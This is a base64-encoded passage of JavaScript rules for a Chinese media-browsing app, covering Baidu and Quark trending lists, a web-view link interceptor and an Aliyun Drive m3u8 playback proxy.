gICAgICAgICAgICAgICAgICAgICAgICBzZXRJdGVtKFxcXCJkYXRhU291cmNlXFxcIiwgaW5wdXQpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySXRlbShcXFwiaG90a2V5XFxcIik7XFxuICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/lt7LliIfmjaLkuLpcXFwiICsgaW5wdXQ7XFxuICAgICAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAgICAgfSwgZGF0YVNvdXJjZSlcXG4gICAgICAgICAgICB9XVxcbiAgICAgICAgfVxcbiAgICB9KTtcXG4gICAgbGV0IHNldFNlYXJjaEtleSA9IG5hbWUgPT4ge1xcbiAgICAgICAgcHV0TXlWYXIoJ3MnLCBuYW1lKTtcXG4gICAgICAgIHJlZnJlc2hQYWdlKCk7XFxuICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxuICAgIH07XFxuXFxuICAgIGxldCBnZXRUaXRsZSA9IChpLCBuYW1lKSA9PiB7XFxuICAgICAgICBsZXQgY29sb3I7XFxuICAgICAgICBzd2l0Y2ggKGkpIHtcXG4gICAgICAgICAgICBjYXNlIDA6XFxuICAgICAgICAgICAgICAgIGNvbG9yID0gXFxcIiNmZjMzMDBcXFwiO1xcbiAgICAgICAgICAgICAgICBicmVhaztcXG4gICAgICAgICAgICBjYXNlIDE6XFxuICAgICAgICAgICAgICAgIGNvbG9yID0gXFxcIiNmZjY2MDBcXFwiO1xcbiAgICAgICAgICAgICAgICBicmVhaztcXG4gICAgICAgICAgICBjYXNlIDI6XFxuICAgICAgICAgICAgICAgIGNvbG9yID0gXFxcIiNmZjk5MDBcXFwiXFxuICAgICAgICAgICAgICAgIGJyZWFrO1xcbiAgICAgICAgICAgIGRlZmF1bHQ6XFxuICAgICAgICAgICAgICAgIGNvbG9yID0gXFxcImJsYWNrXFxcIjtcXG4gICAgICAgIH1cXG4gICAgICAgIHJldHVybiBcXFwi4oCc4oCc4oCd4oCdXFxcIiArIFN0cmluZyhpICsgMSkuZm9udGNvbG9yKGNvbG9yKSArIFxcXCJcXFxcdFxcXFx0XFxcXHRcXFwiICsgbmFtZTtcXG4gICAgfVxcbiAgICB0cnkge1xcbiAgICAgICAgc3dpdGNoIChzZWxlY3Rzb3VyY2UpIHtcXG4gICAgICAgICAgICBjYXNlIFxcXCLnmb7luqZcXFwiOlxcbiAgICAgICAgICAgICAgICB2YXIganNvbiA9IHJlcXVlc3QoJ2h0dHBzOi8vdG9wLmJhaWR1LmNvbS9hcGkvYm9hcmQ/cGxhdGZvcm09d2lzZSZ0YWI9JyArIHRhYmtleSArICcmdGFnPSU3QiUyMmNhdGVnb3J5JTIyOiUyMiVFNSU4NSVBOCVFOSU4MyVBOCVFNyVCMSVCQiVFNSU5RSU4QiUyMiU3RCcsIHtcXG4gICAgICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNi4wOyBOZXh1cyA1IEJ1aWxkL01SQTU4TikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk5LjAuNDg0NC41MSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsXFxuICAgICAgICAgICAgICAgICAgICAgICAgJ0hvc3QnOiAndG9wLmJhaWR1LmNvbScsXFxuICAgICAgICAgICAgICAgICAgICAgICAgJ0FjY2VwdCc6ICdhcHBsaWNhdGlvbi9qc29uLCB0ZXh0L3BsYWluLCAqLyonLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICdBY2NlcHQtTGFuZ3VhZ2UnOiAnemgtQ04semg7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjcnLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICdBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZSwgYnInLFxcbiAgICAgICAgICAgICAgICAgICAgICAgICdSZWZlcmVyJzogJ2h0dHBzOi8vdG9wLmJhaWR1LmNvbS9ib2FyZD90YWI9bm92ZWwnLFxcbiAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAgICAgLy92YXIgcyA9IERhdGUubm93KCk7XFxuICAgICAgICAgICAgICAgIHZhciBsaXN0ID0gSlNPTi5wYXJzZShqc29uKS5kYXRhLmNhcmRzWzBdLmNvbnRlbnQ7XFxuICAgICAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbGlzdC5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgICAgICAgICAgICAgbGV0IGl0ZW0gPSBsaXN0W2ldO1xcbiAgICAgICAgICAgICAgICAgICAgbGV0IG5hbWUgPSBpdGVtLndvcmQgKyAnICgnICsgaXRlbS5zaG93WzJdICsgJyknO1xcbiAgICAgICAgICAgICAgICAgICAgbGV0IGRlcyA9IGl0ZW0uZGVzYztcXG4gICAgICAgICAgICAgICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IGdldFRpdGxlKGksIG5hbWUpLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHVybDogJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZShzZXRTZWFyY2hLZXksIGl0ZW0ud29yZCksXFxuICAgICAgICAgICAgICAgICAgICAgICAgZGVzYzogZGVzLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGltZzogaXRlbS5pbWcsXFxuICAgICAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJtb3ZpZV8xX3ZlcnRpY2FsX3BpY1xcXCJcXG4gICAgICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIGJyZWFrO1xcbiAgICAgICAgICAgIGNhc2UgXFxcIuWkuOWFi1xcXCI6XFxuICAgICAgICAgICAgICAgIHZhciBqc29uID0gcmVxdWVzdChcXFwiaHR0cHM6Ly9uZXdzLm15cXVhcmsuY24vdjIvdG9wbGlzdC9tb3ZpZT8mY2hhbm5lbD1cXFwiICsgdGFia2V5ICsgXFxcIiZyYW5rX3R5cGU9JUU2JTlDJTgwJUU3JTgzJUFEXFxcIik7XFxuICAgICAgICAgICAgICAgIHZhciB4bWxEYXRhID0gKEpTT04ucGFyc2UoanNvbikuZGF0YSB8fCBcXFwiXFxcIikucmVwbGFjZSgvdGl0bGU+L2csIFxcXCJoX3RpdGxlPlxcXCIpLnJlcGxhY2UoL3NyYz4vZywgXFxcImhfc3JjPlxcXCIpLnJlcGxhY2UoL2FyZWE+L2csIFxcXCJoX2FyZWFcXFwiKTtcXG4gICAgICAgICAgICAgICAgdmFyIGxpc3QgPSBwZGZhKHhtbERhdGEsIFxcXCJib2R5JiZpdGVtXFxcIik7XFxuICAgICAgICAgICAgICAgIHZhciBnZXRUZXh0ID0gdCA9PiB0O1xcbiAgICAgICAgICAgICAgICB2YXIgdHJlbmQgPSBbXFxcIuOEp1xcXCIsIFxcXCLihpFcXFwiLCBcXFwi4oaTXFxcIl07XFxuICAgICAgICAgICAgICAgIC8vdmFyIHMgPSBEYXRlLm5vdygpO1xcbiAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGxpc3QubGVuZ3RoOyBpKyspIHtcXG4gICAgICAgICAgICAgICAgICAgIGxldCBpdGVtID0gbGlzdFtpXTtcXG4gICAgICAgICAgICAgICAgICAgIGxldCBuYW1lID0gcGRmaChpdGVtLCBcXFwiaF90aXRsZSYmVGV4dFxcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgbGV0IGRlcyA9IFxcXCLng63luqbvvJpcXFwiICsgcGRmaChpdGVtLCBcXFwiaG90X3Njb3JlJiZUZXh0XFxcIikgKyBcXFwiIFxcXCIgKyB0cmVuZC5hdChwZGZoKGl0ZW0sIFxcXCJob3RfdHJlbmQmJlRleHRcXFwiKSkgK1xcbiAgICAgICAgICAgICAgICAgICAgICAgIFxcXCJcXFxcbuivhOWIhu+8mlxcXCIgKyBwZGZoKGl0ZW0sIFxcXCJzY29yZV9hdmcmJlRleHRcXFwiKS5yZXBsYWNlKC9eMCQvLCBcXFwi5pqC5peg6K+E5YiGXFxcIikgK1xcbiAgICAgICAgICAgICAgICAgICAgICAgIFxcXCJcXFxcblxcXCIgKyBwZGZoKGl0ZW0sIFxcXCJ5ZWFyJiZUZXh0XFxcIikgKyBcXFwiwrdcXFwiICsgcGRmaChpdGVtLCBcXFwiaF9hcmVhJiZUZXh0XFxcIikgKyBcXFwiwrdcXFwiICsgcGRmaChpdGVtLCBcXFwiY2F0ZWdvcnkmJlRleHRcXFwiKS5yZXBsYWNlKFxcXCIsXFxcIiwgXFxcIsK3XFxcIik7XFxuICAgICAgICAgICAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBnZXRUaXRsZShpLCBuYW1lKSxcXG4gICAgICAgICAgICAgICAgICAgICAgICB1cmw6ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoc2V0U2VhcmNoS2V5LCBuYW1lKSxcXG4gICAgICAgICAgICAgICAgICAgICAgICBkZXNjOiBkZXMsXFxuICAgICAgICAgICAgICAgICAgICAgICAgaW1nOiBwZGZoKGl0ZW0sIFxcXCJoX3NyYyYmVGV4dFxcXCIpLFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFwibW92aWVfMV92ZXJ0aWNhbF9waWNcXFwiXFxuICAgICAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBicmVhaztcXG4gICAgICAgIH1cXG4gICAgfSBjYXRjaCAoZSkge1xcbiAgICAgICAgbG9nKGUudG9TdHJpbmcoKSlcXG4gICAgfVxcbiAgICBzZXRSZXN1bHQoZCk7XFxufVxcbmxldCByID0gZ2V0SXRlbShcXFwicnVsZVxcXCIsIFxcXCJcXFwiKTtcXG5sZXQgcyA9IGdldE15VmFyKCdzJywgJycpfHxNWV9QQVJBTVMuc2VhcmNoVGVybXN8fGRlY29kZVVSSUNvbXBvbmVudChnZXRQYXJhbShcXFwic2VhcmNoVGVybXNcXFwiLCBcXFwiXFxcIikpO1xcbmxldCBzZWFyY2hNb2RlID0gZ2V0U2VhcmNoTW9kZSgpO1xcbmxldCBvcGVuTW9kZSA9IGdldEl0ZW0oXFxcIm9wZW5Nb2RlXFxcIiwgXFxcIuacrOWcsOi9rOeggVxcXCIpO1xcbmxldCBpZCA9IERhdGUubm93KCkgKyBNWV9SVUxFLnRpdGxlO1xcbmxldCBkID0gW107XFxuaWYgKE1ZX1BBR0UgPT09IDEpIHtcXG4gICAgc2V0SGVhZCgpO1xcbiAgICBpZiAoIXMpIHtcXG4gICAgICAgIHNldEhpc3RvcnkoKTtcXG4gICAgfVxcbn1cXG5pZiAocykge1xcbiAgICByZWNvcmQoKVxcbiAgICBzZWFyY2hFbmQoKTtcXG59IGVsc2UgaWYgKE1ZX1BBR0UgPT09IDEpIHtcXG4gICAgc2V0VHJlbmRpbmdUYWJFbmQoKTtcXG59XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLnvZHpobXmtY/op4hcIixcInBhdGhcIjpcInlzZnhcIixcInJ1bGVcIjpcImpzOlxcbnZhciBkID0gW107XFxuXFxubGV0IG9wZW5Nb2RlID0gZ2V0SXRlbShcXFwib3Blbk1vZGVcXFwiKTtcXG5sZXQgcnVsZSA9IE1ZX1JVTEUudGl0bGU7XFxubGV0IHVybCA9IGRlY29kZVVSSUNvbXBvbmVudChnZXRQYXJhbShcXFwid2ViVXJsXFxcIixcXFwiXFxcIikpO1xcblxcbmZ1bmN0aW9uIGludGVyY2VwdChydWxlLCBvcmlnaW4sIG9wZW5Nb2RlKSB7XFxuICAgIGxldCBob3N0ID0gb3JpZ2luLnJlcGxhY2UobmV3IFJlZ0V4cChcXFwiaHR0cDovL3xodHRwczovL1xcXCIpLCBcXFwiXFxcIikuc3BsaXQoXFxcIi9cXFwiKVswXTtcXG4gICAgbGV0IGhvc3RzID0gaG9zdC5zcGxpdChcXFwiLlxcXCIpO1xcbiAgICBpZiAoaG9zdHMubGVuZ3RoID4gMikge1xcbiAgICAgICAgaG9zdCA9IGhvc3RzW2hvc3RzLmxlbmd0aCAtIDJdICsgXFxcIi5cXFwiICsgaG9zdHNbaG9zdHMubGVuZ3RoIC0gMV07XFxuICAgIH1cXG4gICAgaWYgKGlucHV0LnN0YXJ0c1dpdGgoXFxcIm1hZ25ldFxcXCIpKSB7XFxuICAgICAgICBjb25maXJtKHtcXG4gICAgICAgICAgICB0aXRsZTogXFxcIua4qemmqOaPkOekulxcXCIsXFxuICAgICAgICAgICAgY29udGVudDogXFxcIuajgOa1i+WIsOaWsOeahOejgemTvuWcsOWdgO+8jOeCueWHu+ehruWumuaMiemSruWNs+WPr+aSreaUvu+8jOeCueWHu+WPlua2iOaMiemSruWPr+S7peWkjeWItumTvuaOpVxcXCIsXFxuICAgICAgICAgICAgY29uZmlybTogJC50b1N0cmluZygobWFnKSA9PiB7XFxuICAgICAgICAgICAgICAgIHJldHVybiBtYWc7XFxuICAgICAgICAgICAgfSwgaW5wdXQpLFxcbiAgICAgICAgICAgIGNhbmNlbDogJC50b1N0cmluZygobWFnKSA9PiB7XFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFwiY29weTovL1xcXCIgKyBtYWdcXG4gICAgICAgICAgICB9LCBpbnB1dClcXG4gICAgICAgIH0pO1xcbiAgICAgICAgcmV0dXJuIHRydWU7XFxuICAgIH0gZWxzZSBpZiAoaW5wdXQuaW5jbHVkZXMoXFxcImFsaXl1bmRyaXZlLmNvbVxcXCIpICYmIG9wZW5Nb2RlICE9IFxcXCLlrpjmlrlBUFBcXFwiKSB7XFxuICAgICAgICBsb2coaW5wdXQpO1xcbiAgICAgICAgaWYgKGlucHV0LmluY2x1ZGVzKCdjaGVja3VybD91cmw9JykgJiYgaW5wdXQuaW5jbHVkZXMoJyZ1cmxyZWZlcicpKSB7XFxuICAgICAgICAgICAgaW5wdXQgPSBkZWNvZGVVUklDb21wb25lbnQoaW5wdXQuc3BsaXQoJyZ1cmxyZWZlcicpWzBdLnNwbGl0KCdjaGVja3VybD91cmw9JylbMV0pO1xcbiAgICAgICAgICAgIC8vbG9nKCfotLTlkKcnK2lucHV0KTtcXG4gICAgICAgIH1cXG4gICAgICAgIHJldHVybiAkLnRvU3RyaW5nKCh1cmwsIHJ1bGUpID0+IHtcXG4gICAgICAgICAgICBmeV9icmlkZ2VfYXBwLm9wZW4oSlNPTi5zdHJpbmdpZnkoe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcIumYv+mHjOS6keebmFxcXCIsXFxuICAgICAgICAgICAgICAgIHVybDogXFxcImhpa2VyOi8vcGFnZS9hbGl5dW4/cGFnZT1meXBhZ2UmcmVhbHVybD1cXFwiICsgZW5jb2RlVVJJQ29tcG9uZW50KHVybCkgKyBcXFwiJnJ1bGU9XFxcIiArIHJ1bGUsXFxuICAgICAgICAgICAgfSkpXFxuICAgICAgICB9LCBpbnB1dCwgcnVsZSk7XFxuICAgIH0gZWxzZSBpZiAoL1xcXFwuKG1wM3xmbGFjfG00YSkkLy50ZXN0KGlucHV0KSkge1xcbiAgICAgICAgbG9nKGlucHV0KTtcXG4gICAgICAgIHJldHVybiAkLnRvU3RyaW5nKCh1cmwsIHJ1bGUpID0+IHtcXG4gICAgICAgICAgICBmeV9icmlkZ2VfYXBwLnBsYXlWaWRlbyh1cmwpO1xcbiAgICAgICAgfSwgaW5wdXQsIHJ1bGUpO1xcbiAgICB9IGVsc2UgaWYgKCFpbnB1dC5pbmNsdWRlcyhob3N0KSAmJiBpbnB1dC5zdGFydHNXaXRoKFxcXCJodHRwXFxcIikpIHtcXG4gICAgICAgIGxvZyhpbnB1dCk7XFxuICAgICAgICByZXR1cm4gJC50b1N0cmluZygodXJsLCBydWxlKSA9PiB7XFxuICAgICAgICAgICAgZnlfYnJpZGdlX2FwcC5vcGVuKEpTT04uc3RyaW5naWZ5KHtcXG4gICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLor6bmg4VcXFwiLFxcbiAgICAgICAgICAgICAgICB1cmw6IFxcXCJoaWtlcjovL3BhZ2UveXNmeD93ZWJVcmw9XFxcIitlbmNvZGVVUklDb21wb25lbnQodXJsKStcXFwiJnJ1bGU9XFxcIitydWxlLFxcbiAgICAgICAgICAgIH0pKVxcbiAgICAgICAgfSwgaW5wdXQsIHJ1bGUpO1xcbiAgICB9IGVsc2UgaWYgKCFpbnB1dC5zdGFydHNXaXRoKFxcXCJodHRwXFxcIikpIHtcXG4gICAgICAgIGxvZyhpbnB1dCk7XFxuICAgICAgICAvL+iDveWUpOi1t0FQUOeahOeZveWQjeWNlVxcbiAgICAgICAgbGV0IHdoaXRlID0gW1xcbiAgICAgICAgICAgIFxcXCJxa2xpbmtcXFwiLFxcbiAgICAgICAgICAgIFxcXCJiZG5ldGRpc2tcXFwiLFxcbiAgICAgICAgICAgIFxcXCJ4dW5sZWlhcHBcXFwiLFxcbiAgICAgICAgICAgIFxcXCJzbWFydGRyaXZlXFxcIlxcbiAgICAgICAgXTtcXG4gICAgICAgIGxldCBpbldoaXRlID0gd2hpdGUuZmlsdGVyKGl0ID0+IGlucHV0LnN0YXJ0c1dpdGgoaXQpKS5sZW5ndGggPiAwO1xcbiAgICAgICAgaWYgKCFpbldoaXRlKSB7XFxuICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xcbiAgICAgICAgfVxcbiAgICAgICAgcmV0dXJuICQudG9TdHJpbmcoKHVybCwgcnVsZSkgPT4ge1xcbiAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAub3BlblRoaXJkQXBwICYmIGZ5X2JyaWRnZV9hcHAub3BlblRoaXJkQXBwKHVybCk7XFxuICAgICAgICB9LCBpbnB1dCwgcnVsZSk7XFxuICAgIH1cXG59XFxuXFxuZnVuY3Rpb24gbG9hZEpzKCkge1xcbiAgICB0cnkge1xcbiAgICAgICAgaWYgKGRvY3VtZW50LnRpdGxlICYmIGRvY3VtZW50LnRpdGxlLmxlbmd0aCkge1xcbiAgICAgICAgICAgIGxldCByID0gJCQkKCkubGF6eVJ1bGUoKHQpID0+IHtcXG4gICAgICAgICAgICAgICAgc2V0UGFnZVRpdGxlKHQpO1xcbiAgICAgICAgICAgIH0sIGRvY3VtZW50LnRpdGxlKTtcXG4gICAgICAgICAgICBmeV9icmlkZ2VfYXBwLnBhcnNlTGF6eVJ1bGUocik7XFxuICAgICAgICB9XFxuICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgIGZ5X2JyaWRnZV9hcHAubG9nKGUudG9TdHJpbmcoKSk7XFxuICAgIH1cXG59XFxuXFxuZC5wdXNoKHtcXG4gICAgdXJsOiB1cmwsXFxuICAgIGNvbF90eXBlOiBcXFwieDVfd2Vidmlld19zaW5nbGVcXFwiLFxcbiAgICBkZXNjOiBcXFwiMTAwJSYmZmxvYXRcXFwiLFxcbiAgICBleHRyYToge1xcbiAgICAgICAgdXJsSW50ZXJjZXB0b3I6ICQudG9TdHJpbmcoaW50ZXJjZXB0LCBydWxlLCBnZXRIb21lKHVybCksIG9wZW5Nb2RlKSxcXG4gICAgICAgIGpzOiAkLnRvU3RyaW5nKGxvYWRKcyksXFxuICAgICAgICBjYW5CYWNrOiB0cnVlLFxcbiAgICAgICAganNMb2FkaW5nSW5qZWN0OiB0cnVlLFxcbiAgICAgICAgZmxvYXRWaWRlbzogdHJ1ZVxcbiAgICB9XFxufSk7XFxuXFxuc2V0UmVzdWx0KGQpO1wifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi6Zi/6YeMTGF6eVwiLFwicGF0aFwiOlwiYWxpbGF6eVwiLFwicnVsZVwiOlwiY29uc3QgQWxpQWNjZXNzQXBpID0gJC5yZXF1aXJlKFxcXCJhbGlQbGF5QXBpXFxcIik7XFxuY29uc3Qge1xcbiAgICBvcGVuVG9rZW5zRmlsZXBhdGgsXFxuICAgIGFsaVRva2Vuc0ZpbGVwYXRoXFxufSA9ICQucmVxdWlyZShcXFwidG9rZW5QYXRoXFxcIik7XFxuXFxuZnVuY3Rpb24gYWxpTTN1OFByb3h5KGZpbGVJZCwgc2hhcmVJZCwgc2hhcmVQd2QsIHNoYXJlVG9rZW4sIGFsaVRva2VuLCB0aXRsZSkge1xcbiAgICBmdW5jdGlvbiBnZXRBbGlQbGF5VXJsKGZpbGVJZCwgbGluZSkge1xcbiAgICAgICAgbGV0IGFsaXVybDtcXG4gICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgY29uc3QgQWxpQWNjZXNzQXBpID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvYWxpUGxheUFwaT9ydWxlPVxcXCIgKyB0aXRsZSk7XFxuICAgICAgICAgICAgbGV0IGFsaUFjY2Vzc0FwaSA9IEFsaUFjY2Vzc0FwaS5jcmVhdGVEZWZhdWx0KHNoYXJlSWQsIHNoYXJlUHdkLCBzaGFyZVRva2VuLCBhbGlUb2tlbiwgbnVsbCwgdGl0bGUpO1xcbiAgICAgICAgICAgIGxldCBwbGF5VXJsTGlzdCA9IGFsaUFjY2Vzc0FwaS5nZXRTaGFyZVZpZGVvUHJldmlldyhmaWxlSWQpIHx8IFtdO1xcbiAgICAgICAgICAgIHBsYXlVcmxMaXN0LmZvckVhY2goKGl0ZW0pID0+IHtcXG4gICAgICAgICAgICAgICAgaWYgKGl0ZW0udGVtcGxhdGVfaWQgPT0gbGluZSkge1xcbiAgICAgICAgICAgICAgICAgICAgYWxpdXJsID0gaXRlbS51cmw7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgICAgICBsb2coZS50b1N0cmluZygpKTtcXG4gICAgICAgICAgICB0aHJvdyBlO1xcbiAgICAgICAgfVxcbiAgICAgICAgcmV0dXJuIGFsaXVybDtcXG4gICAgfVxcblxcbiAgICBmdW5jdGlvbiBnZXRNM3U4Q29udGVudChwbGF5dXJsKSB7XFxuXFxuICAgICAgICAvL2xvZyhcXFwi5oiR5Zyo5Luj55CGXFxcIiArIHBsYXl1cmwpO1xcbiAgICAgICAgbGV0IGhvbWUgPSBwbGF5dXJsLnNwbGl0KCdtZWRpYS5tM3U4JylbMF07XFxuICAgICAgICBsZXQgZiA9IGZldGNoKHBsYXl1cmwsIHtcXG4gICAgICAgICAgICBoZWFkZXJzOiB7XFxuICAgICAgICAgICAgICAgICdSZWZlcmVyJzogJ2h0dHBzOi8vd3d3LmFsaXl1bmRyaXZlLmNvbS8nXFxuICAgICAgICAgICAgfSxcXG4gICAgICAgICAgICB0aW1lb3V0OiAzMDAwXFxuICAgICAgICB9KS5zcGxpdChcXFwiXFxcXG5cXFwiKTtcXG4gICAgICAgIGxldCBmZiA9IGYubWFwKGl0ID0+IHtcXG4gICAgICAgICAgICBpZiAoaXQuc3RhcnRzV2l0aChcXFwibWVkaWEtXFxcIikpIHtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXCIvcHJveHk/dXJsPVxcXCIgKyBiYXNlNjRFbmNvZGUoaG9tZSArIGl0KTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgcmV0dXJuIGl0O1xcbiAgICAgICAgfSkuam9pbihcXFwiXFxcXG5cXFwiKTtcXG4gICAgICAgIC8vbG9nKCd1ZmlkLScgKyBmaWxlaWQpO1xcbiAgICAgICAgd3JpdGVGaWxlKCdoaWtlcjovL2ZpbGVzL19jYWNoZS8nICsgZmlsZUlkICsgJy5tM3U4JywgZmYpO1xcbiAgICAgICAgcmV0dXJuIGZmO1xcbiAgICB9XFxuXFxuICAgIGZ1bmN0aW9uIHVwZGF0ZVRzVXJsKHVybCkge1xcbiAgICAgICAgbGV0IGZpZCA9IHVybC5zcGxpdCgnJmY9JylbMV0uc3BsaXQoJyYnKVswXTtcXG4gICAgICAgIC8vbG9nKCdzZmlkLScgKyBmaWQpO1xcbiAgICAgICAgbGV0IGYgPSBmZXRjaCgnaGlrZXI6Ly9maWxlcy9fY2FjaGUvJyArIGZpZCArICcubTN1OCcpLnNwbGl0KFxcXCJcXFxcblxcXCIpO1xcbiAgICAgICAgZi5mb3JFYWNoKGl0ID0+IHtcXG4gICAgICAgICAgICBpZiAoaXQgJiYgaXQuc3RhcnRzV2l0aCgnL3Byb3h5P3VybD0nKSkge1xcbiAgICAgICAgICAgICAgICBsZXQgZnVybCA9IGJhc2U2NERlY29kZShpdC5yZXBsYWNlKCcvcHJveHk/dXJsPScsICcnKSk7XFxuICAgICAgICAgICAgICAgIGlmICh1cmwuc3Vic3RyKHVybC5pbmRleE9mKCcvbWVkaWEtJyksIHVybC5pbmRleE9mKCcudHMnKSkgPT0gZnVybC5zdWJzdHIoZnVybC5pbmRleE9mKCcvbWVkaWEtJyksIGZ1cmwuaW5kZXhPZignLnRzJykpKSB7XFxuICAgICAgICAgICAgICAgICAgICB1cmwgPSBmdXJsO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSlcXG4gICAgICAgIGxldCBleHBpcmVzID0gdXJsLnNwbGl0KCd4LW9zcy1leHBpcmVzPScpWzFdLnNwbGl0KCcmJylbMF07XFxuICAgICAgICBjb25zdCBsYXN0dGltZSA9IHBhcnNlSW50KGV4cGlyZXMpIC0gRGF0ZS5ub3coKSAvIDEwMDA7XFxuICAgICAgICBpZiAobGFzdHRpbWUgPCA2MCkge1xcbiAgICAgICAgICAgIC8vbG9nKCfov4fmnJ/mm7TmlrAnKVxcbiAgICAgICAgICAgIGxldCBsaW5lID0gdXJsLnNwbGl0KCcvbWVkaWEnKVswXTsgLy/lj5bkuYvliY3mkq3mlL7nmoR0c+autee6v+i3r1xcbiAgICAgICAgICAgIGxpbmUgPSBsaW5lLnN1YnN0cmluZyhsaW5lLmxhc3RJbmRleE9mKCcvJykgKyAxKTtcXG4gICAgICAgICAgICBsZXQgZiA9IGdldE0zdThDb250ZW50KGdldEFsaVBsYXlVcmwoZmlkLCBsaW5lKSkuc3BsaXQoXFxcIlxcXFxuXFxcIik7XFxuICAgICAgICAgICAgZi5mb3JFYWNoKGl0ID0+IHtcXG4gICAgICAgICAgICAgICAgaWYgKGl0ICYmIGl0LnN0YXJ0c1dpdGgoJy9wcm94eT91cmw9JykpIHtcXG4gICAgICAgICAgICAgICAgICAgIGxldCBmdXJsID0gYmFzZTY0RGVjb2RlKGl0LnJlcGxhY2UoJy9wcm94eT91cmw9JywgJycpKTtcXG4gICAgICAgICAgICAgICAgICAgIGlmICh1cmwuc3Vic3RyKHVybC5pbmRleE9mKCcvbWVkaWEtJyksIHVybC5pbmRleE9mKCcudHMnKSkgPT0gZnVybC5zdWJzdHIoZnVybC5pbmRleE9mKCcvbWVkaWEtJyksIGZ1cmwuaW5kZXhPZignLnRzJykpKSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgdXJsID0gZnVybDtcXG4gICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH0pXFxuXFxuICAgICAgICB9XFxuICAgICAgICByZXR1cm4gdXJsO1xcbiAgICB9XFxuICAgIHRyeSB7XFxuICAgICAgICBsZXQgdXJsID0gYmFzZTY0RGVjb2RlKE1ZX1BBUkFNUy51cmwpO1xcbiAgICAgICAgaWYgKHVybC5pbmNsdWRlcyhcXFwiLnRzXFxcIikpIHtcXG4gICAgICAgICAgICByZXR1cm4gSlNPTi5zdHJpbmdpZnkoe1xcbiAgICAgICAgICAgICAgICBzdGF0dXNDb2RlOiAzMDIsXFxuICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJMb2NhdGlvblxcXCI6IHVwZGF0ZVRzVXJsKHVybCksXFxuICAgICAgICAgICAgICAgICAgICAnUmVmZXJlcic6ICdodHRwczovL3d3dy5hbGl5dW5kcml2ZS5jb20vJ1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIC8vbG9nKHVybCk7XFxuICAgICAgICAgICAgbGV0IGZmID0gZ2V0TTN1OENvbnRlbnQoZ2V0QWxpUGxheVVybChmaWxlSWQsIE1ZX1BBUkFNUy50ZW1wbGF0ZUlkKSk7XFxuICAgICAgICAgICAgcmV0dXJuIGZmO1xcbiAgICAgICAgfVxcbiAgICB9IGNhdGNoIChlKSB7XFxuICAgICAgICBsb2coXFxcIuS7o+eQhuaSreaUvuWksei0pSNcXFxcbumUmeivr+S/oeaBrz5cXFwiICsgZS50b1N0cmluZygpICsgXFxcIlxcXFxu6ZSZ6K+v6KGMPlxcXCIgKyBlLmxpbmVOdW1iZXIpO1xcbiAgICB9XFxufVxcblxcblxcbmZ1bmN0aW9uIGdldFZpZGVvKGFsaUFjY2Vzc0FwaSwgZmlsZUlkKSB7XFxuXFxuICAgIGxldCBwbGF5VXJsTGlzdCA9IGFsaUFjY2Vzc0FwaS5nZXRTaGFyZVZpZGVvUHJldmlldyhmaWxlSWQpIHx8IFtdO1xcblxcbiAgICBsZXQgc